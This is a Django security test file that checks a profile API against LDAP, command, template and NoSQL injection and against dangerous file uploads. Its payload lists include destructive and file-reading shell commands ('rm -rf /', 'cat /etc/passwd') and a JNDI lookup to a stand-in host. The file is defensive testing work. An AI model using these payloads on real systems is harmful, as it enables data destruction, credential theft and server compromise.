import json
from unittest.mock import patch

from django.contrib.auth import get_user_model
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import TestCase, Client

User = get_user_model()


class InjectionSecurityTest(TestCase):
    """Тести захисту від injection атак"""

    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            email='injection@example.com',
            password='Injection123!',
            name='Test',
            surname='User',
            role='student',
            is_verified_email=True,
            is_active=True
        )
        self.client.force_login(self.user)

    def create_valid_jpeg_file(self, filename="test.jpg"):
        """Створює валідний JPEG файл для тестування"""
        jpeg_content = (
            b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00'
            b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
            b'\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
            b'\x1f\x1e\x1d\x1a\x1c\x1c $.\' ",#\x1c\x1c(7),01444\x1f\'9=82<.342'
            b'\xff\xc0\x00\x11\x08\x00\x01\x00\x01\x01\x01\x11\x00\x02\x11\x01'
            b'\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x10\x01\x00'
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff'
            b'\xda\x00\x08\x01\x01\x00\x00?\x00\x00\xff\xd9'
        )
        return SimpleUploadedFile(filename, jpeg_content, content_type="image/jpeg")

    def test_ldap_injection_protection(self):
        """Тест захисту від LDAP injection"""
        ldap_payloads = [
            'admin)(|(password=*)) Vinsent',
            'admin)(&(password=*)) Vinsent',
            '*)(uid=* Vinsent',
            '*)((| Vinsent',
            ')(|(objectClass=*) Vinsent',
        ]

        for payload in ldap_payloads:
            data = {
                'user': {
                    'name': payload
                }
            }

            response = self.client.patch(
                '/api/user/profile/',
                data=json.dumps(data),
                content_type='application/json'
            )

            self.assertEqual(response.status_code, 200)

            response = self.client.get('/api/user/profile/')
            profile_data = response.json()
            name = profile_data['user']['name']

            ldap_special_chars = ['(', ')', '|', '&', '*']
            for char in ldap_special_chars:
                self.assertNotIn(char, name)

    def test_command_injection_protection(self):
        """Тест захисту від command injection"""
        command_payloads = [
            '; rm -rf /',
            '| cat /etc/passwd',
            '&& rm file.txt',
            '`whoami`',
            '$(id)',
        ]

        for payload in command_payloads:
            data = {
                'profile': {
                    'bio': f'Hello world {payload} test'
                }
            }

            response = self.client.patch(
                '/api/user/profile/',
                data=json.dumps(data),
                content_type='application/json'
            )

            self.assertEqual(response.status_code, 200)

            response = self.client.get('/api/user/profile/')
            profile_data = response.json()
            bio = profile_data.get('profile', {}).get('bio') or ''

            dangerous_chars = [';', '|', '&', '`', '$']
            for char in dangerous_chars:
                self.assertNotIn(char, bio)

    def test_template_injection_protection(self):
        """Тест захисту від template injection"""
        template_payloads = [
            '{{7*7}}',
            '${jndi:ldap://evil.com/x}',
            '<%= 7*7 %>',
            '{% if true %}test{% endif %}',
        ]

        for payload in template_payloads:
            data = {
                'profile': {
                    'bio': f'Test bio {payload} content'
                }
            }

            response = self.client.patch(
                '/api/user/profile/',
                data=json.dumps(data),
                content_type='application/json'
            )

            self.assertEqual(response.status_code, 200)

            response = self.client.get('/api/user/profile/')
            profile_data = response.json()
            bio = profile_data.get('profile', {}).get('bio') or ''

            self.assertNotIn('{{', bio)
            self.assertNotIn('}}', bio)
            self.assertNotIn('${', bio)
            self.assertNotIn('49', bio)

    def test_command_injection_in_bio(self):
        """Тест захисту від command injection у біо"""
        data = {
            'profile': {
                'bio': 'Hello world; rm -rf / malicious command'
            }
        }

        response = self.client.patch(
            '/api/user/profile/',
            data=json.dumps(data),
            content_type='application/json'
        )

        self.assertEqual(response.status_code, 200)

        response = self.client.get('/api/user/profile/')
        profile_data = response.json()
        bio = profile_data.get('profile', {}).get('bio') or ''

        self.assertNotIn(';', bio)
        self.assertNotIn('rm', bio)

    @patch('subprocess.run')
    def test_system_command_injection_with_file(self, mock_subprocess):
        """Тест захисту від системних команд при завантаженні файлів"""

        valid_file = self.create_valid_jpeg_file("normal_test.jpg")

        response = self.client.post(
            '/api/user/profile/',
            {'profile_picture': valid_file}
        )

        self.assertEqual(response.status_code, 200)
        mock_subprocess.assert_not_called()

    def test_nosql_injection_protection(self):
        """Тест захисту від NoSQL injection"""
        nosql_payloads = [
            '$where', '$ne', '$gt', '$lt', '$regex', '$or', '$and', '$exists', '$in', '$nin'
        ]

        for payload in nosql_payloads:
            data = {
                'profile': {
                    'bio': f"User bio with {payload} injection attempt"
                }
            }

            response = self.client.patch(
                '/api/user/profile/',
                json.dumps(data),
                content_type='application/json'
            )

            self.assertEqual(response.status_code, 400)
            response_data = response.json()
            error_message = response_data.get('message', '') or response_data.get('error', '')
            self.assertIn('NoSQL injection pattern detected', error_message)

    def test_dangerous_file_extension_protection(self):
        """Тест захисту від небезпечних розширень файлів"""
        dangerous_extensions = ['.php', '.asp', '.jsp', '.exe', '.bat', '.cmd', '.sh']

        for ext in dangerous_extensions:
            dangerous_file = SimpleUploadedFile(
                f"malicious{ext}",
                b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00',
                content_type="image/jpeg"
            )

            response = self.client.post(
                '/api/user/profile/',
                {'profile_picture': dangerous_file}
            )

            self.assertEqual(response.status_code, 400)
            response_data = response.json()
            error_message = response_data.get('message', '') or response_data.get('error', '')
            self.assertIn('Dangerous file extension detected', error_message)

    def test_file_content_type_spoofing_protection(self):
        """Тест захисту від підміни content-type"""
        fake_image = SimpleUploadedFile(
            "fake_image.jpg",
            b"This is just plain text, not an image",
            content_type="image/jpeg"
        )

        response = self.client.post(
            '/api/user/profile/',
            {'profile_picture': fake_image}
        )

        self.assertEqual(response.status_code, 400)
        response_data = response.json()
        error_message = response_data.get('message', '') or response_data.get('error', '')
        self.assertIn('File signature does not match declared type', error_message)

    def test_oversized_file_protection(self):
        """Тест захисту від великих файлів"""
        large_content = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00' + b'\x00' * (6 * 1024 * 1024)
        large_file = SimpleUploadedFile(
            "large.jpg",
            large_content,
            content_type="image/jpeg"
        )

        response = self.client.post(
            '/api/user/profile/',
            {'profile_picture': large_file}
        )

        self.assertEqual(response.status_code, 400)
        response_data = response.json()
        error_message = response_data.get('message', '') or response_data.get('error', '')
        self.assertIn('File too large', error_message)

    def test_content_type_spoofing_with_magic_detection(self):
        """Тест перевірки підміни через magic bytes"""
        pdf_content = b'%PDF-1.4\n%\xe2\xe3\xcf\xd3\n'
        spoofed_file = SimpleUploadedFile(
            "spoofed.jpg",
            pdf_content,
            content_type="image/jpeg"
        )

        response = self.client.post(
            '/api/user/profile/',
            {'profile_picture': spoofed_file}
        )

        self.assertEqual(response.status_code, 400)
        response_data = response.json()
        error_message = response_data.get('message', '') or response_data.get('error', '')
        self.assertTrue(
            'Content-Type spoofing detected' in error_message or
            'File signature does not match declared type' in error_message
        )

    def test_file_type_validation(self):
        """Тест валідації типів файлів"""
        invalid_file = SimpleUploadedFile(
            "document.txt",
            b"This is a text document",
            content_type="text/plain"
        )

        response = self.client.post(
            '/api/user/profile/',
            {'profile_picture': invalid_file}
        )

        self.assertEqual(response.status_code, 400)
        response_data = response.json()
        error_message = response_data.get('message', '') or response_data.get('error', '')
        self.assertIn('File type not allowed', error_message)
